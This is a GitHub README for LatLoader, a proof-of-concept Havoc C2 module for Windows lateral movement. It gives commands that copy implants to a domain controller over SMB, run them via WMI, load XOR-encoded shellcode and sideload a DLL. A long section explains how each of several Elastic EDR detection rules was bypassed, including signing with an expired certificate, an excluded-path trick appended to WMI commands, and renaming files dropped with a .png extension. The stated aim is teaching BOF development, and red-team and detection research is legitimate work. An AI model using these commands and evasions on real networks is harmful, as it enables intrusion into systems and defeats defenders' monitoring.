# https://github.com/icyguider/LatLoader

[Skip to content](https://github.com/icyguider/LatLoader#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/icyguider/LatLoader) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/icyguider/LatLoader) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/icyguider/LatLoader) to refresh your session.Dismiss alert

{{ message }}

[icyguider](https://github.com/icyguider)/ **[LatLoader](https://github.com/icyguider/LatLoader)** Public

- [Notifications](https://github.com/login?return_to=%2Ficyguider%2FLatLoader) You must be signed in to change notification settings
- [Fork\\
35](https://github.com/login?return_to=%2Ficyguider%2FLatLoader)
- [Star\\
307](https://github.com/login?return_to=%2Ficyguider%2FLatLoader)


PoC module to demonstrate automated lateral movement with the Havoc C2 framework.


### License

[GPL-3.0 license](https://github.com/icyguider/LatLoader/blob/main/LICENSE)

[307\\
stars](https://github.com/icyguider/LatLoader/stargazers) [35\\
forks](https://github.com/icyguider/LatLoader/forks) [Branches](https://github.com/icyguider/LatLoader/branches) [Tags](https://github.com/icyguider/LatLoader/tags) [Activity](https://github.com/icyguider/LatLoader/activity)

[Star](https://github.com/login?return_to=%2Ficyguider%2FLatLoader)

[Notifications](https://github.com/login?return_to=%2Ficyguider%2FLatLoader) You must be signed in to change notification settings

# icyguider/LatLoader

main

[**1** Branch](https://github.com/icyguider/LatLoader/branches) [**0** Tags](https://github.com/icyguider/LatLoader/tags)

[Go to Branches page](https://github.com/icyguider/LatLoader/branches)[Go to Tags page](https://github.com/icyguider/LatLoader/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![icyguider](https://avatars.githubusercontent.com/u/79864975?v=4&size=40)](https://github.com/icyguider)[icyguider](https://github.com/icyguider/LatLoader/commits?author=icyguider)<br>[Update for Havoc v0.7 + Update README](https://github.com/icyguider/LatLoader/commit/9438f67bd469fd0bf855676dbe7a3b34067f036a)<br>Open commit details<br>3 years agoDec 8, 2023<br>[9438f67](https://github.com/icyguider/LatLoader/commit/9438f67bd469fd0bf855676dbe7a3b34067f036a) · 3 years agoDec 8, 2023<br>## History<br>[5 Commits](https://github.com/icyguider/LatLoader/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/icyguider/LatLoader/commits/main/) 5 Commits |
| [src](https://github.com/icyguider/LatLoader/tree/main/src "src") | [src](https://github.com/icyguider/LatLoader/tree/main/src "src") | [First push](https://github.com/icyguider/LatLoader/commit/79ef973d3eb86800d891b004c07e8f9d1fb1ffd4 "First push") | 3 years agoOct 6, 2023 |
| [LICENSE](https://github.com/icyguider/LatLoader/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/icyguider/LatLoader/blob/main/LICENSE "LICENSE") | [Initial commit](https://github.com/icyguider/LatLoader/commit/426d6373ed66bce2b0dc45c88be0150a1cc03a6c "Initial commit") | 3 years agoOct 6, 2023 |
| [LatLoader.py](https://github.com/icyguider/LatLoader/blob/main/LatLoader.py "LatLoader.py") | [LatLoader.py](https://github.com/icyguider/LatLoader/blob/main/LatLoader.py "LatLoader.py") | [Update for Havoc v0.7 + Update README](https://github.com/icyguider/LatLoader/commit/9438f67bd469fd0bf855676dbe7a3b34067f036a "Update for Havoc v0.7 + Update README  Fixed argument handling which caused the module for Havoc v0.7 to fail. Also updated README to reflect the fact that Elastic updated their rules to address many of the bypasses shown.") | 3 years agoDec 8, 2023 |
| [Makefile](https://github.com/icyguider/LatLoader/blob/main/Makefile "Makefile") | [Makefile](https://github.com/icyguider/LatLoader/blob/main/Makefile "Makefile") | [First push](https://github.com/icyguider/LatLoader/commit/79ef973d3eb86800d891b004c07e8f9d1fb1ffd4 "First push") | 3 years agoOct 6, 2023 |
| [README.md](https://github.com/icyguider/LatLoader/blob/main/README.md "README.md") | [README.md](https://github.com/icyguider/LatLoader/blob/main/README.md "README.md") | [Update for Havoc v0.7 + Update README](https://github.com/icyguider/LatLoader/commit/9438f67bd469fd0bf855676dbe7a3b34067f036a "Update for Havoc v0.7 + Update README  Fixed argument handling which caused the module for Havoc v0.7 to fail. Also updated README to reflect the fact that Elastic updated their rules to address many of the bypasses shown.") | 3 years agoDec 8, 2023 |
| View all files |

## Repository files navigation

# LatLoader

[Permalink: LatLoader](https://github.com/icyguider/LatLoader#latloader)

LatLoader is a PoC module to demonstrate automated lateral movement with the Havoc C2 framework. The main purpose of this project is to help others learn BOF and Havoc module development. This project can also help others understand basic EDR rule evasions, particularly when performing lateral movement.

The `sideload` subcommand is the full-featured PoC of this module. It will attempt to perform lateral movement via DLL sideloading while evading default Elastic EDR rules. For a full list of every rule evaded by this module and how it was done, please see the below section titled [Elastic EDR Rule Evasions](https://github.com/icyguider/LatLoader#elastic-edr-rule-evasions).

Video demo w/ Elastic EDR: [https://youtu.be/W0PZZPpsO6U](https://youtu.be/W0PZZPpsO6U)

**UPDATE: 10 days after the release of this tool, Elastic updated some of its rules to address the bypasses demonstrated by this project. Please see the [Oct 17th commit](https://github.com/elastic/protections-artifacts/commit/7310e500a6178b6d9f5c189f9ac8de155037836f) in their [protections-artifacts](https://github.com/elastic/protections-artifacts) repo to view the changes made to applicable rules (Like [this one](https://github.com/elastic/protections-artifacts/commit/7310e500a6178b6d9f5c189f9ac8de155037836f#diff-a546f8d6214e32d67e92e76125daa6cb3a4d516616c79f12ccdadffd9c3c2b5b) for example).**

## Dependencies/Basic Usage

[Permalink: Dependencies/Basic Usage](https://github.com/icyguider/LatLoader#dependenciesbasic-usage)

This module was designed to work on Linux systems with `mingw-w64` installed. Additionally, you must have [osslsigncode](https://github.com/mtrojnar/osslsigncode) installed to provide cert signing for the DLL utilized by the `sideload` subcommand. Once all dependencies are installed, simply type `make` and then load the module into Havoc using the script manager. To view help in Havoc, run `help LatLoader`. To view help for subcommands, run `help LatLoader [subcommand]`.

[![help](https://private-user-images.githubusercontent.com/79864975/273250893-340d7cf5-2307-48ef-9e7c-fcd8f7cb103b.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI4NTAsIm5iZiI6MTc3MTQxMjU1MCwicGF0aCI6Ii83OTg2NDk3NS8yNzMyNTA4OTMtMzQwZDdjZjUtMjMwNy00OGVmLTllN2MtZmNkOGY3Y2IxMDNiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDIzMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWEyOWM5M2IwMmY5MTdhMGRkMzc3YTY0MWMyZTBhZGEwZDE5MTIzYWZiYWMzMTQyN2ViNmNhODhmZDI0MGFmNDgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Rrp2jGwlk21MyQtsETorQOHiCVLsXN9S96HySLhG2_w)](https://private-user-images.githubusercontent.com/79864975/273250893-340d7cf5-2307-48ef-9e7c-fcd8f7cb103b.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI4NTAsIm5iZiI6MTc3MTQxMjU1MCwicGF0aCI6Ii83OTg2NDk3NS8yNzMyNTA4OTMtMzQwZDdjZjUtMjMwNy00OGVmLTllN2MtZmNkOGY3Y2IxMDNiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDIzMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWEyOWM5M2IwMmY5MTdhMGRkMzc3YTY0MWMyZTBhZGEwZDE5MTIzYWZiYWMzMTQyN2ViNmNhODhmZDI0MGFmNDgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Rrp2jGwlk21MyQtsETorQOHiCVLsXN9S96HySLhG2_w)

## Usage/Subcommands

[Permalink: Usage/Subcommands](https://github.com/icyguider/LatLoader#usagesubcommands)

The LatLoader module contains 5 different subcommands. The first two, `rupload` and `exec`, serve as the main mechanism for executing the provided BOFs. The 3 other subcommands (`load`, `xorload`, & `sideload`) combine the previous two in order to perform automated lateral movement.

The `rupload` command can be used to upload a local file to a remote system via SMB using the `writefileBOF.c` BOF like so:

```
LatLoader rupload dc1 /root/demon.x64.exe C:\Windows\Temp\test.exe
```

[![rupload](https://private-user-images.githubusercontent.com/79864975/273250781-9f5b6315-7414-4c09-a5e1-68900ad58f4a.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI4NTAsIm5iZiI6MTc3MTQxMjU1MCwicGF0aCI6Ii83OTg2NDk3NS8yNzMyNTA3ODEtOWY1YjYzMTUtNzQxNC00YzA5LWE1ZTEtNjg5MDBhZDU4ZjRhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDIzMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTIyMGJjMTRlOGYzY2YzNWE4NDlhYzc2OTc2Y2E2YTc3ZGM5YTc3YzgyMDNmMTE0YjI0ZTIwZjQwNTA5OTE2ODUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.nnsqX0qL5GDzDmuk0h2DnX4NchZbvfZj020zvUNhbDE)](https://private-user-images.githubusercontent.com/79864975/273250781-9f5b6315-7414-4c09-a5e1-68900ad58f4a.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI4NTAsIm5iZiI6MTc3MTQxMjU1MCwicGF0aCI6Ii83OTg2NDk3NS8yNzMyNTA3ODEtOWY1YjYzMTUtNzQxNC00YzA5LWE1ZTEtNjg5MDBhZDU4ZjRhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDIzMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTIyMGJjMTRlOGYzY2YzNWE4NDlhYzc2OTc2Y2E2YTc3ZGM5YTc3YzgyMDNmMTE0YjI0ZTIwZjQwNTA5OTE2ODUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.nnsqX0qL5GDzDmuk0h2DnX4NchZbvfZj020zvUNhbDE)

The `exec` subcommand can be used to execute a command on a remote system via WMI using the `wmiBOF.cpp` BOF like so:

```
LatLoader exec dc1 "cmd.exe /c whoami > C:\poc.txt"
```

[![exec](https://private-user-images.githubusercontent.com/79864975/273251100-90d569fc-ee15-4ed4-9ad5-d984454ea597.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI4NTAsIm5iZiI6MTc3MTQxMjU1MCwicGF0aCI6Ii83OTg2NDk3NS8yNzMyNTExMDAtOTBkNTY5ZmMtZWUxNS00ZWQ0LTlhZDUtZDk4NDQ1NGVhNTk3LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDIzMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQ2OWE0OGEzZTA1MzZjYjVhYTQwOTNkMGNjMGMxOTQ0MzE1MjU4ZjYzYzY0MzJjMDI1Mjk1ZmUyYjViM2ZmNDMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.l89Ytj8_d_LrVDJR6R2vL-Q8O4QXX2IvwDUS9-O8Ev0)](https://private-user-images.githubusercontent.com/79864975/273251100-90d569fc-ee15-4ed4-9ad5-d984454ea597.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI4NTAsIm5iZiI6MTc3MTQxMjU1MCwicGF0aCI6Ii83OTg2NDk3NS8yNzMyNTExMDAtOTBkNTY5ZmMtZWUxNS00ZWQ0LTlhZDUtZDk4NDQ1NGVhNTk3LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDIzMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQ2OWE0OGEzZTA1MzZjYjVhYTQwOTNkMGNjMGMxOTQ0MzE1MjU4ZjYzYzY0MzJjMDI1Mjk1ZmUyYjViM2ZmNDMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.l89Ytj8_d_LrVDJR6R2vL-Q8O4QXX2IvwDUS9-O8Ev0)

The `load` subcommand combines the two subcommands above to transfer a specified exe to the remote host via SMB and execute it over WMI:

```
LatLoader load dc1 /root/test.exe
```

[![load](https://private-user-images.githubusercontent.com/79864975/273251183-ea475419-ca1a-4786-b40c-6716638e1e5b.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI4NTAsIm5iZiI6MTc3MTQxMjU1MCwicGF0aCI6Ii83OTg2NDk3NS8yNzMyNTExODMtZWE0NzU0MTktY2ExYS00Nzg2LWI0MGMtNjcxNjYzOGUxZTViLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDIzMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU3NTkyMzJlZDYyYWEzZTJiNGE4YTZiNTFhZDcxODFlOTRlMjg1YWU4YzUxY2VjNDU2MjhhNzliZWE2OWU2NmQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.f8EcU9Dbw-wgv23kXa2B8_godPwRDpt3EtpDDdknHC8)](https://private-user-images.githubusercontent.com/79864975/273251183-ea475419-ca1a-4786-b40c-6716638e1e5b.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI4NTAsIm5iZiI6MTc3MTQxMjU1MCwicGF0aCI6Ii83OTg2NDk3NS8yNzMyNTExODMtZWE0NzU0MTktY2ExYS00Nzg2LWI0MGMtNjcxNjYzOGUxZTViLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDIzMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU3NTkyMzJlZDYyYWEzZTJiNGE4YTZiNTFhZDcxODFlOTRlMjg1YWU4YzUxY2VjNDU2MjhhNzliZWE2OWU2NmQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.f8EcU9Dbw-wgv23kXa2B8_godPwRDpt3EtpDDdknHC8)

The `xorload` subcommand will perform lateral movement using a simple shellcode loader. This is designed to bypass basic AV detections:

```
LatLoader xorload dc1 /root/demon.x64.bin
```

[![xorload](https://private-user-images.githubusercontent.com/79864975/273251264-384c9c70-aeeb-4b5d-a261-3a5724468009.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI4NTAsIm5iZiI6MTc3MTQxMjU1MCwicGF0aCI6Ii83OTg2NDk3NS8yNzMyNTEyNjQtMzg0YzljNzAtYWVlYi00YjVkLWEyNjEtM2E1NzI0NDY4MDA5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDIzMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWIyZWViNjZhYjdiNzI2ZGUxMjEwN2I3M2FhYzM5MjA0OGNiNWMzYWNjYmJhM2U3MTQwZGUxNjgxZTg5OTBiN2ImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.4f2GWfV6p-KRaUKDs1xeXc9KC-J3AcLJbRvDFftZX1o)](https://private-user-images.githubusercontent.com/79864975/273251264-384c9c70-aeeb-4b5d-a261-3a5724468009.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI4NTAsIm5iZiI6MTc3MTQxMjU1MCwicGF0aCI6Ii83OTg2NDk3NS8yNzMyNTEyNjQtMzg0YzljNzAtYWVlYi00YjVkLWEyNjEtM2E1NzI0NDY4MDA5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDIzMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWIyZWViNjZhYjdiNzI2ZGUxMjEwN2I3M2FhYzM5MjA0OGNiNWMzYWNjYmJhM2U3MTQwZGUxNjgxZTg5OTBiN2ImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.4f2GWfV6p-KRaUKDs1xeXc9KC-J3AcLJbRvDFftZX1o)

Finally, the `sideload` subcommand will perform lateral movement by DLL sideloading a simple shellcode loader. Actions were also taken to evade various elastic EDR rules.

```
LatLoader sideload dc1 /root/demon.x64.bin
```

[![sideload](https://private-user-images.githubusercontent.com/79864975/273251373-8af2aa2e-7ddb-496d-8b34-dc67860b38c8.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI4NTAsIm5iZiI6MTc3MTQxMjU1MCwicGF0aCI6Ii83OTg2NDk3NS8yNzMyNTEzNzMtOGFmMmFhMmUtN2RkYi00OTZkLThiMzQtZGM2Nzg2MGIzOGM4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDIzMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU2ZTYwOGZmYjczMWU5OGY4OTcyODNjNzU2MTI2Y2I2NDUxZGM4MDA2YzgxMWE5MzQ2M2MxYWFmMzg2OTEyZGUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.9933SfKder6trZpnotfk_geFRBlHedQraBCIFq6_YYk)](https://private-user-images.githubusercontent.com/79864975/273251373-8af2aa2e-7ddb-496d-8b34-dc67860b38c8.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI4NTAsIm5iZiI6MTc3MTQxMjU1MCwicGF0aCI6Ii83OTg2NDk3NS8yNzMyNTEzNzMtOGFmMmFhMmUtN2RkYi00OTZkLThiMzQtZGM2Nzg2MGIzOGM4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDIzMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU2ZTYwOGZmYjczMWU5OGY4OTcyODNjNzU2MTI2Y2I2NDUxZGM4MDA2YzgxMWE5MzQ2M2MxYWFmMzg2OTEyZGUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.9933SfKder6trZpnotfk_geFRBlHedQraBCIFq6_YYk)

## Elastic EDR Rule Evasions

[Permalink: Elastic EDR Rule Evasions](https://github.com/icyguider/LatLoader#elastic-edr-rule-evasions)

The following is a list of various Elastic EDR rules that could alert when performing lateral movement. I have provided what steps were taken to evade each rule. All evasions described here were implemented in the `sideload` subcommand to demonstrate how they can be combined to create a fully functional PoC.

* * *

#### [Remote Execution via File Shares](https://www.elastic.co/guide/en/security/current/remote-execution-via-file-shares.html)

[Permalink: Remote Execution via File Shares](https://github.com/icyguider/LatLoader#remote-execution-via-file-shares)

**Description:** Identifies the execution of a file that was created by the virtual system process. This may indicate lateral movement via network file shares.

**Bypass:** This rule was bypassed by performing DLL sideloading.

* * *

#### [Malicious Behavior Detection Alert: Unsigned File Execution via Network Logon](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/lateral_movement_unsigned_file_execution_via_network_logon.toml)

[Permalink: Malicious Behavior Detection Alert: Unsigned File Execution via Network Logon](https://github.com/icyguider/LatLoader#malicious-behavior-detection-alert-unsigned-file-execution-via-network-logon)

**Description:** Identifies the execution of a recently created file that is unsigned or untrusted and from a remote network logon. This may indicate lateral movement via remote services.

**Bypass:** This rule was bypassed by performing DLL sideloading.

* * *

#### [Malicious Behavior Detection Alert: Execution of a File Dropped from SMB](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/lateral_movement_execution_of_a_file_dropped_from_smb.toml)

[Permalink: Malicious Behavior Detection Alert: Execution of a File Dropped from SMB](https://github.com/icyguider/LatLoader#malicious-behavior-detection-alert-execution-of-a-file-dropped-from-smb)

**Description:** Identifies the execution of a file that was created by the virtual system process and subsequently executed. This may indicate lateral movement via network file shares.

**Bypass:** This rule was bypassed by executing the transferred file using cmd.exe /c. This evades the rule because the file is not executed directly, but instead by a trusted binary.

* * *

#### [WMI Incoming Lateral Movement](https://www.elastic.co/guide/en/security/current/wmi-incoming-lateral-movement.html)

[Permalink: WMI Incoming Lateral Movement](https://github.com/icyguider/LatLoader#wmi-incoming-lateral-movement)

**Description:** Identifies processes executed via Windows Management Instrumentation (WMI) on a remote host. This could be indicative of adversary lateral movement, but could be noisy if administrators use WMI to remotely manage hosts.

**Bypass:** This rule was bypassed by including a path in our command that the rule excludes. As seen in the query, `C:\\Windows\\CCMCache\\*` is one of these directories, which was appended to each wmi command like so: `&& echo --path C:\\Windows\\CCMCache\\cache`

* * *

#### [Malicious Behavior Prevention Alert: DLL Side Loading via a Copied Microsoft Executable](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_dll_side_loading_via_a_copied_microsoft_executable.toml)

[Permalink: Malicious Behavior Prevention Alert: DLL Side Loading via a Copied Microsoft Executable](https://github.com/icyguider/LatLoader#malicious-behavior-prevention-alert-dll-side-loading-via-a-copied-microsoft-executable)

**Description:** Identifies when a Microsoft signed binary is copied to a directory and shortly followed by the loading of an unsigned DLL from the same directory. Adversaries may opt for moving Microsoft signed binaries to a random directory and use them as a host for malicious DLL sideloading during the installation phase.

**Bypass:** This rule was bypassed by signing the DLL sideloader with an expired cert. The expired cert was obtained from here: [https://github.com/utoni/PastDSE/tree/main/certs](https://github.com/utoni/PastDSE/tree/main/certs)

* * *

#### [Malicious Behavior Prevention Alert: VirtualProtect API Call from an Unsigned DLL](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_virtualprotect_api_call_from_an_unsigned_dll.toml)

[Permalink: Malicious Behavior Prevention Alert: VirtualProtect API Call from an Unsigned DLL](https://github.com/icyguider/LatLoader#malicious-behavior-prevention-alert-virtualprotect-api-call-from-an-unsigned-dll)

**Description:** Identifies the load of an unsigned or untrusted DLL by a trusted binary followed by calling VirtualProtect API to change memory permission to execute or write. This may indicate execution via DLL sideloading to perform code injection.

**Bypass:** This rule was bypassed by signing the DLL sideloader with an expired cert. The expired cert was obtained from here: [https://github.com/utoni/PastDSE/tree/main/certs](https://github.com/utoni/PastDSE/tree/main/certs)

* * *

#### [Potential Lateral Tool Transfer via SMB Share](https://www.elastic.co/guide/en/security/current/potential-lateral-tool-transfer-via-smb-share.html)

[Permalink: Potential Lateral Tool Transfer via SMB Share](https://github.com/icyguider/LatLoader#potential-lateral-tool-transfer-via-smb-share)

**Description:** Identifies the creation or change of a Windows executable file over network shares. Adversaries may transfer tools or other files between systems in a compromised environment.

**Bypass:** This rule was bypassed by creating the file via SMB with a safe extension like .png, and then making a copy of the file with it's real extension via WMI.

* * *

#### [Malicious Behavior Detection Alert: ImageLoad of a File dropped via SMB](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/lateral_movement_imageload_of_a_file_dropped_via_smb.toml)

[Permalink: Malicious Behavior Detection Alert: ImageLoad of a File dropped via SMB](https://github.com/icyguider/LatLoader#malicious-behavior-detection-alert-imageload-of-a-file-dropped-via-smb)

**Description:** Identifies the transfer of a library via SMB followed by loading it into commonly DLL proxy execution binaries such as rundll32, regsvr32 and shared services via svchost.exe. This may indicate an attempt to remotely execute malicious code.

**Bypass:** This rule was bypassed by creating the file via SMB with a safe extension like .png, and then making a copy of the file with it's real extension via WMI.

* * *

## Standalone binaries

[Permalink: Standalone binaries](https://github.com/icyguider/LatLoader#standalone-binaries)

I have also provided standalone versions of the BOFs used in this project. These could be useful if you are unfamiliar with BOF development and would like to learn by comparing a normal program to it's BOF counterpart.

`wmiexec.cpp` is the standalone binary for command execution via WMI. It can be compiled with mingw like so:

```
x86_64-w64-mingw32-g++ wmiexec.cpp -I include -l oleaut32 -l ole32 -l wbemuuid -w -static -o /share/wmiexec.exe
```

The exe can then be transferred to the target and executed like so, providing arguments via the cli:

```
.\wmiexec.exe dc1 'cmd.exe /c whoami > c:\test.txt'
```

`writefile.c` is the standalone binary for file transfer via SMB. It can be compiled with mingw like so:

```
x86_64-w64-mingw32-gcc writefile.c -w -static -o /share/writefile.exe
```

The exe can then be transferred to the target and executed like so, providing arguments via the cli:

```
.\writefile.exe .\test.txt \\dc1\C$\poc.txt
```

## Notes

[Permalink: Notes](https://github.com/icyguider/LatLoader#notes)

